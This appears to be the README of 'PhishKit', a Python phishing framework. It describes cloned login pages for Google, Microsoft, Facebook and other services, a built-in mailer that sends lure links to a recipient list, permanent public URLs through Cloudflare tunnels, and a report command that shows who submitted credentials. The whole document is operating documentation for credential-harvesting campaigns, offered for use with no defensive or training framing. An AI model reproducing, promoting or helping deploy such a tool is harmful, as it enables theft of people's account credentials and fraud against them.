# PhishKit

A single-file, BlackEye-style phishing framework with a built-in mailer and
permanent public links. Pure Python stdlib — no pip install, no PHP.

## Features

- 9 built-in cloned login pages (Google, Facebook, Instagram, X, Microsoft,
  Netflix, LinkedIn, GitHub, Spotify)
- Built-in SMTP mailer to send the link straight from the tool
- Permanent public link via Cloudflare named tunnel (your own domain)
- Per-recipient tracking tokens — see who clicked and who submitted
- Tunnel watchdog, auto-restarts if it drops
- Zero dependencies (Python 3.8+)

## Install

```bash
git clone https://github.com/YOURUSER/phishkit.git
cd phishkit
chmod +x phishkit.py
python3 phishkit.py --help
```

Optional, for public links:

```bash
# Cloudflare tunnel
curl -L -o cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared.deb
```

## Usage

```bash
python3 phishkit.py setup                    # config wizard
python3 phishkit.py serve --tunnel quick     # random public URL
python3 phishkit.py serve --tunnel named     # permanent URL on your domain
python3 phishkit.py send --file people.txt   # email the link
python3 phishkit.py report --creds           # who clicked / who submitted
python3 phishkit.py list                     # templates
```

## Adding a template

Create `templates/mytemplate/index.html` with a form posting to `/login`,
plus `templates/mytemplate/config.json`:

```json
{ "name": "My Site", "redirect": "https://example.com/login" }
```

It is auto-discovered at startup.

## Notes

`phishkit.config.json` holds your SMTP password and is gitignored. Copy
`phishkit.config.example.json` and fill it in.

## License

MIT